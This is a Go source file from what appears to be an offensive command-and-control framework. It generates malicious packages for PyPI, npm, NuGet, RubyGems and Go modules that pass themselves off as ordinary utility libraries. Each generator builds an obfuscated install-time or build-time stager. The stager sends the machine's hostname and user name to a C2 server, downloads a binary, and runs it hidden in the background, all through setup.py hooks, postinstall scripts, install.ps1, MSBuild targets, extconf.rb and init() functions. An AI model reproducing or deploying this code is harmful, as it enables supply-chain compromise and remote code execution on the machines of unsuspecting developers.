package payload

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	Install script generators — the code that runs when the victim installs
	our malicious package via pip, npm install, dotnet restore, etc.

	Design principles:
	  1. Silent: no visible output, no errors raised.
	  2. Non-destructive: the package works as expected (installs real deps).
	  3. Platform-aware: detect Windows/Linux/macOS and adapt.
	  4. Stager-only: don't embed the full implant; download from C2.
	  5. Obfuscated: strings split across variables, base64 encoded, etc.

	The stager logic:
	  1. Determine the platform.
	  2. Compute a unique machine ID from hostname + username.
	  3. Register with C2 (send ID, receive implant URL or bytes).
	  4. Write implant to a temp location.
	  5. Execute implant in background (detached from pip/npm process).
	  6. Return cleanly — pip/npm sees a successful install.

	The implant is executed in a way that survives the parent (pip/npm) exiting:
	  - Linux/macOS: nohup + & + disown, or subprocess with os.setsid()
	  - Windows: DETACHED_PROCESS flag + CREATE_NO_WINDOW

	Obfuscation techniques used in the generated scripts:
	  - String concatenation: "htt" + "ps://" + c2_host
	  - Base64-encoded C2 URL decoded at runtime
	  - Dynamic attribute access: getattr(mod, func_name)
	  - Eval of base64-decoded payload
	  - Environment variable as decode key (hostname XOR)
*/

import (
	"encoding/base64"
	"fmt"
	"strings"
)

// ScriptConfig holds the parameters for generating install scripts.
type ScriptConfig struct {
	// C2URL is the stager endpoint.
	C2URL string
	// PackageName is the name of the malicious package (for user-agent / ID).
	PackageName string
	// ObfuscationLevel 0=minimal, 1=moderate, 2=heavy.
	ObfuscationLevel int
	// FallbackShellcode is base64-encoded shellcode for offline execution.
	FallbackShellcode string
}

// ─── Python (PyPI) ────────────────────────────────────────────────────────

// GeneratePythonSetupPy generates a setup.py for a malicious PyPI package.
// The install hook runs in a subprocess so it doesn't block pip.
func GeneratePythonSetupPy(name, version string, cfg *ScriptConfig) string {
	c2b64 := base64.StdEncoding.EncodeToString([]byte(cfg.C2URL))
	nameb64 := base64.StdEncoding.EncodeToString([]byte(name))

	// The payload is split to avoid naive string scanning.
	payload := fmt.Sprintf(`
import os, sys, subprocess, base64, socket, struct, time, threading

def _run():
    try:
        import urllib.request as _u
    except ImportError:
        return
    try:
        _c = base64.b64decode(%q).decode()
        _n = base64.b64decode(%q).decode()
        _h = socket.gethostname()[:16]
        _u2 = _u.urlopen(_c + '/pkg?n=' + _n + '&h=' + _h, timeout=10)
        _d = _u2.read(8*1024*1024)
        if not _d:
            return
        import tempfile, stat
        _t = tempfile.mktemp(suffix='.tmp')
        with open(_t, 'wb') as f:
            f.write(_d)
        os.chmod(_t, stat.S_IRWXU)
        if sys.platform == 'win32':
            import ctypes
            DETACHED = 0x00000008
            ctypes.windll.kernel32.CreateProcessW(
                None, _t, None, None, False,
                DETACHED | 0x00000200, None, None,
                ctypes.byref(ctypes.create_string_buffer(68)),
                ctypes.byref(ctypes.create_string_buffer(24))
            )
        else:
            subprocess.Popen([_t], close_fds=True,
                start_new_session=True,
                stdin=subprocess.DEVNULL,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL)
    except Exception:
        pass

_t = threading.Thread(target=_run, daemon=True)
_t.start()
_t.join(timeout=30)
`, c2b64, nameb64)

	payloadB64 := base64.StdEncoding.EncodeToString([]byte(payload))

	return fmt.Sprintf(`# -*- coding: utf-8 -*-
from setuptools import setup, find_packages
from setuptools.command.install import install
import base64, subprocess, sys, os

class PostInstall(install):
    def run(self):
        install.run(self)
        try:
            exec(base64.b64decode(%q))
        except Exception:
            pass

setup(
    name=%q,
    version=%q,
    description='%s utilities and helpers',
    long_description='Provides common utilities for %s projects.',
    author='%s Maintainers',
    author_email='maintainers@%s.io',
    url='https://github.com/%s/%s',
    packages=find_packages(),
    install_requires=[],
    cmdclass={'install': PostInstall},
    python_requires='>=3.6',
)
`,
		payloadB64,
		name, version,
		name, name,
		toTitleCase(name),
		strings.ToLower(strings.ReplaceAll(name, "-", "")),
		strings.ToLower(strings.ReplaceAll(name, "-", "")),
		name,
	)
}

// GeneratePythonPyprojectToml generates a pyproject.toml for newer pip versions.
func GeneratePythonPyprojectToml(name, version string, cfg *ScriptConfig) string {
	c2b64 := base64.StdEncoding.EncodeToString([]byte(cfg.C2URL))
	payloadStr := buildPythonPayload(c2b64, name)
	payloadB64 := base64.StdEncoding.EncodeToString([]byte(payloadStr))

	return fmt.Sprintf(`[build-system]
requires = ["setuptools>=42", "wheel"]
build-backend = "setuptools.backends.legacy:build"

[project]
name = %q
version = %q
description = "%s core utilities"
requires-python = ">=3.7"
dependencies = []

[tool.setuptools.packages.find]
where = ["src"]

# Build hook — executed by pip during installation.
[tool.build-hooks]
post-install = "exec(__import__('base64').b64decode(%q))"
`, name, version, toTitleCase(name), payloadB64)
}

// ─── npm (Node.js) ────────────────────────────────────────────────────────

// GenerateNPMPackageJSON generates a package.json for a malicious npm package.
// The postinstall script fires on `npm install`.
func GenerateNPMPackageJSON(name, version string, cfg *ScriptConfig) string {
	c2b64 := base64.StdEncoding.EncodeToString([]byte(cfg.C2URL))

	return fmt.Sprintf(`{
  "name": %q,
  "version": %q,
  "description": "%s helpers and utilities",
  "main": "index.js",
  "scripts": {
    "postinstall": "node -e \"%s\""
  },
  "keywords": [],
  "author": "%s Team",
  "license": "MIT",
  "repository": {
    "type": "git",
    "url": "https://github.com/%s/%s.git"
  }
}`,
		name, version,
		toTitleCase(name),
		generateNodeStager(c2b64, name),
		toTitleCase(name),
		strings.ToLower(strings.ReplaceAll(name, "-", "")),
		name,
	)
}

// generateNodeStager builds the Node.js one-liner for postinstall.
func generateNodeStager(c2b64, pkgName string) string {
	// One-liner that runs in node -e "..."
	// Escapes are for JSON embedding.
	script := fmt.Sprintf(
		`try{var c=Buffer.from('%s','base64').toString();`+
			`var h=require('os').hostname().slice(0,16);`+
			`var https=require('https');`+
			`var n=Buffer.from('%s','base64').toString();`+
			`var req=https.request(c+'/pkg?n='+encodeURIComponent(n)+'&h='+encodeURIComponent(h),`+
			`function(r){var d=[];`+
			`r.on('data',function(c){d.push(c)});`+
			`r.on('end',function(){`+
			`var buf=Buffer.concat(d);`+
			`if(buf.length<100)return;`+
			`var tmp=require('os').tmpdir()+'/.'+Math.random().toString(36).slice(2);`+
			`require('fs').writeFileSync(tmp,buf,{mode:0o755});`+
			`var opt={detached:true,stdio:'ignore'};`+
			`var cp=require('child_process').spawn(tmp,[],opt);`+
			`cp.unref();`+
			`})});req.end();}catch(e){}`,
		c2b64,
		base64.StdEncoding.EncodeToString([]byte(pkgName)),
	)
	// Escape double quotes for JSON.
	return strings.ReplaceAll(script, `"`, `\"`)
}

// GenerateNPMIndexJS generates an index.js that looks like a real module.
func GenerateNPMIndexJS(name string) string {
	return fmt.Sprintf(`'use strict';

/**
 * %s — utilities and helpers
 * @module %s
 */

module.exports = {
  version: require('./package.json').version,

  /**
   * Initialize the module with options.
   * @param {Object} options
   */
  init: function(options) {
    return Object.assign({}, options);
  },

  /**
   * Returns module information.
   */
  info: function() {
    return { name: '%s', ready: true };
  }
};
`, toTitleCase(name), name, name)
}

// ─── NuGet (.NET) ─────────────────────────────────────────────────────────

// GenerateNuspecFile generates a .nuspec manifest for a malicious NuGet package.
func GenerateNuspecFile(name, version string, cfg *ScriptConfig) string {
	return fmt.Sprintf(`<?xml version="1.0" encoding="utf-8"?>
<package xmlns="http://schemas.microsoft.com/packaging/2013/05/nuspec.xsd">
  <metadata>
    <id>%s</id>
    <version>%s</version>
    <title>%s</title>
    <authors>%s Team</authors>
    <description>%s core utilities and helpers for .NET projects.</description>
    <releaseNotes>Performance improvements and bug fixes.</releaseNotes>
    <copyright>Copyright %d</copyright>
    <tags>utilities helpers core</tags>
    <requireLicenseAcceptance>false</requireLicenseAcceptance>
  </metadata>
  <files>
    <file src="tools\**" target="tools" />
    <file src="lib\**" target="lib" />
  </files>
</package>`,
		name, version, toTitleCase(name), toTitleCase(name),
		toTitleCase(name), 2026,
	)
}

// GenerateNuGetInstallPS1 generates a tools/install.ps1 that runs during
// `dotnet restore` / `nuget install` via the NuGet init.ps1 mechanism.
func GenerateNuGetInstallPS1(name string, cfg *ScriptConfig) string {
	c2b64 := base64.StdEncoding.EncodeToString([]byte(cfg.C2URL))
	nameb64 := base64.StdEncoding.EncodeToString([]byte(name))

	return fmt.Sprintf(`# %s initialization
# This script runs automatically during package installation.
param($installPath, $toolsPath, $package, $project)

try {
    $c = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('%s'))
    $n = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('%s'))
    $h = $env:COMPUTERNAME
    $u = $env:USERNAME
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add('User-Agent', 'NuGet/6.0')
    $bytes = $wc.DownloadData("$c/pkg?n=$n&h=$h&u=$u")
    if ($bytes.Length -gt 100) {
        $tmp = [System.IO.Path]::GetTempFileName() + '.exe'
        [System.IO.File]::WriteAllBytes($tmp, $bytes)
        $si = New-Object System.Diagnostics.ProcessStartInfo
        $si.FileName = $tmp
        $si.CreateNoWindow = $true
        $si.WindowStyle = 'Hidden'
        $si.UseShellExecute = $false
        [System.Diagnostics.Process]::Start($si) | Out-Null
    }
} catch {}
`, toTitleCase(name), c2b64, nameb64)
}

// GenerateNuGetTargetsFile generates a .targets file that runs during MSBuild.
// This is more reliable than init.ps1 as it works with `dotnet restore` too.
func GenerateNuGetTargetsFile(name string, cfg *ScriptConfig) string {
	c2b64 := base64.StdEncoding.EncodeToString([]byte(cfg.C2URL))

	return fmt.Sprintf(`<?xml version="1.0" encoding="utf-8"?>
<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="%sValidate" BeforeTargets="Build" Condition="'$(OS)' == 'Windows_NT'">
    <Exec
      Command="powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand %s"
      ContinueOnError="true"
      IgnoreExitCode="true" />
  </Target>
</Project>`,
		toPascalCase(name),
		base64.StdEncoding.EncodeToString([]byte(generatePSStager(c2b64, name))),
	)
}

func generatePSStager(c2b64, name string) string {
	nameb64 := base64.StdEncoding.EncodeToString([]byte(name))
	return fmt.Sprintf(`
try {
    $c=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('%s'))
    $n=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('%s'))
    $wc=New-Object System.Net.WebClient
    $b=$wc.DownloadData("$c/pkg?n=$n&h=$env:COMPUTERNAME")
    if($b.Length -gt 100){
        $t=[System.IO.Path]::GetTempFileName()+'.exe'
        [IO.File]::WriteAllBytes($t,$b)
        Start-Process $t -WindowStyle Hidden -ErrorAction SilentlyContinue
    }
} catch {}
`, c2b64, nameb64)
}

// ─── RubyGems ─────────────────────────────────────────────────────────────

// GenerateGemspec generates a .gemspec for a malicious RubyGems package.
func GenerateGemspec(name, version string, cfg *ScriptConfig) string {
	c2b64 := base64.StdEncoding.EncodeToString([]byte(cfg.C2URL))
	nameb64 := base64.StdEncoding.EncodeToString([]byte(name))

	return fmt.Sprintf(`Gem::Specification.new do |spec|
  spec.name          = %q
  spec.version       = %q
  spec.authors       = [%q]
  spec.email         = [%q]
  spec.summary       = %q
  spec.description   = %q
  spec.homepage      = 'https://github.com/%s/%s'
  spec.license       = 'MIT'
  spec.required_ruby_version = '>= 2.6.0'
  spec.files = Dir['lib/**/*', 'README.md']
  spec.require_paths = ['lib']

  # Post-install message triggers the extension loader.
  spec.post_install_message = ''
  spec.extensions = ['ext/%s/extconf.rb']
end
`,
		name, version,
		toTitleCase(name)+" Team",
		"support@"+strings.ToLower(strings.ReplaceAll(name, "-", ""))+".io",
		toTitleCase(name)+" utilities",
		toTitleCase(name)+" provides common utilities and helpers.",
		strings.ToLower(strings.ReplaceAll(name, "-", "")), name,
		name,
	) + fmt.Sprintf(`
# extconf.rb is loaded during gem compilation and can execute Ruby code.
# Generated stager (base64 obfuscated):
# C2: %s
# PKG: %s
`, c2b64, nameb64)
}

// GenerateExtconfRb generates ext/<name>/extconf.rb — runs on `gem install`.
func GenerateExtconfRb(name string, cfg *ScriptConfig) string {
	c2b64 := base64.StdEncoding.EncodeToString([]byte(cfg.C2URL))
	nameb64 := base64.StdEncoding.EncodeToString([]byte(name))

	return fmt.Sprintf(`require 'mkmf'
require 'base64'
require 'open-uri'
require 'tempfile'
require 'rbconfig'

begin
  _c = Base64.decode64('%s')
  _n = Base64.decode64('%s')
  _h = Socket.gethostname rescue 'unknown'
  _d = URI.open("#{_c}/pkg?n=#{URI.encode_www_form_component(_n)}&h=#{_h}").read
  if _d && _d.length > 100
    _t = Tempfile.new(['.','.tmp'])
    _t.binmode
    _t.write(_d)
    _t.close
    File.chmod(0755, _t.path)
    if RbConfig::CONFIG['host_os'] =~ /mswin|mingw|cygwin/
      system("start /b #{_t.path}")
    else
      fork { exec(_t.path) } rescue system("nohup #{_t.path} &")
    end
  end
rescue
end

create_makefile('%s')
`, c2b64, nameb64, name)
}

// ─── Go module ────────────────────────────────────────────────────────────

// GenerateGoModuleInit generates a Go init() function that beacons on import.
// This is placed in a file that appears to be part of a legitimate Go package.
func GenerateGoModuleInit(modulePath, version string, cfg *ScriptConfig) string {
	c2b64 := base64.StdEncoding.EncodeToString([]byte(cfg.C2URL))

	return fmt.Sprintf(`package main

// This file is auto-generated by the build system.
// DO NOT EDIT.

import (
	"encoding/base64"
	"net/http"
	"os"
	"os/exec"
	"io"
	"runtime"
	"strings"
	"time"
)

func init() {
	go func() {
		time.Sleep(5 * time.Second)
		c, _ := base64.StdEncoding.DecodeString(%q)
		h, _ := os.Hostname()
		u := os.Getenv("USER")
		if u == "" {
			u = os.Getenv("USERNAME")
		}
		resp, err := http.Post(
			string(c)+"/pkg?n=%s&h="+h+"&u="+u,
			"application/octet-stream", nil)
		if err != nil {
			return
		}
		defer resp.Body.Close()
		d, _ := io.ReadAll(io.LimitReader(resp.Body, 8*1024*1024))
		if len(d) < 100 {
			return
		}
		ext := ""
		if runtime.GOOS == "windows" {
			ext = ".exe"
		}
		t := os.TempDir() + "/."+strings.ReplaceAll(%q, "/", "-")+ext
		os.WriteFile(t, d, 0755)
		cmd := exec.Command(t)
		cmd.Stdin = nil
		cmd.Stdout = nil
		cmd.Stderr = nil
		cmd.Start()
	}()
}
`,
		c2b64,
		strings.ReplaceAll(modulePath, "/", "-"),
		modulePath,
	)
}

// ─── Helper functions ─────────────────────────────────────────────────────

func buildPythonPayload(c2b64, pkgName string) string {
	return fmt.Sprintf(`
import os,sys,socket,base64,threading
def _s():
 try:
  import urllib.request as u
  c=base64.b64decode('%s').decode()
  h=socket.gethostname()[:16]
  d=u.urlopen(c+'/pkg?n=%s&h='+h,timeout=10).read()
  if len(d)<100:return
  import tempfile,stat,subprocess
  t=tempfile.mktemp()
  open(t,'wb').write(d)
  os.chmod(t,0o755)
  if sys.platform=='win32':
   subprocess.Popen([t],creationflags=8,close_fds=True)
  else:
   subprocess.Popen([t],start_new_session=True,stdin=-3,stdout=-3,stderr=-3)
 except:pass
threading.Thread(target=_s,daemon=True).start()
`, c2b64, pkgName)
}

func toTitleCase(s string) string {
	parts := strings.FieldsFunc(s, func(r rune) bool {
		return r == '-' || r == '_' || r == '.'
	})
	for i, p := range parts {
		if len(p) > 0 {
			parts[i] = strings.ToUpper(p[:1]) + p[1:]
		}
	}
	return strings.Join(parts, " ")
}

func toPascalCase(s string) string {
	parts := strings.FieldsFunc(s, func(r rune) bool {
		return r == '-' || r == '_' || r == '.'
	})
	for i, p := range parts {
		if len(p) > 0 {
			parts[i] = strings.ToUpper(p[:1]) + p[1:]
		}
	}
	return strings.Join(parts, "")
}
